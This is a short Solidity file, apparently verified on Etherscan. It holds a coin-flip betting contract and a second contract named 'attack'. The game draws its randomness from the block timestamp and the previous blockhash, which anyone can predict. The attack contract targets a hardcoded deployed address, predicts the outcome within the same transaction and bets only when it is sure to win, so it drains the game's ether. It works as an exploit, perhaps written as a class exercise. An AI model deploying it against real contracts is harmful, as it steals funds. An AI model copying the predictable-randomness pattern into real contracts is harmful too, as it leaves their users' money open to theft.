/**
 *Submitted for verification at Etherscan.io on 2021-05-26
*/

pragma solidity ^0.4.26;

contract class_gane{
    event win(address);
    
    function get_random() public view returns(uint){
        bytes32 ramdon = keccak256(abi.encodePacked(now,blockhash(block.number-1)));
        return uint(ramdon)%1000;
        
    }
    function play()public payable{
        require (msg.value == 0.01 ether);
        if(get_random()>=500){
            msg.sender.transfer(0.02 ether);
            emit win (msg.sender);
        }
    }
    function() public payable {
        require(msg.value==1 ether);
    }
    constructor() public payable{
        require (msg.value == 1 ether);
    }
}

contract attack{
    address public game= 0xe231a778a8335A9D01BC2F156F503039dE84D63c;
    
    class_gane gamecontract = class_gane (game); //指定合約
    
    //亂數預測
    function get_random() public view returns(uint){
        bytes32 ramdon = keccak256(abi.encodePacked(now,blockhash(block.number-1)));
        return uint(ramdon)%1000;
        
    }
    function atk()public payable{
        require (get_random()>=500);
        gamecontract.play.value(0.01 ether)();
    }
    function() public payable {
        
    }
    constructor() public payable{
        require (msg.value == 1 ether);
    }
}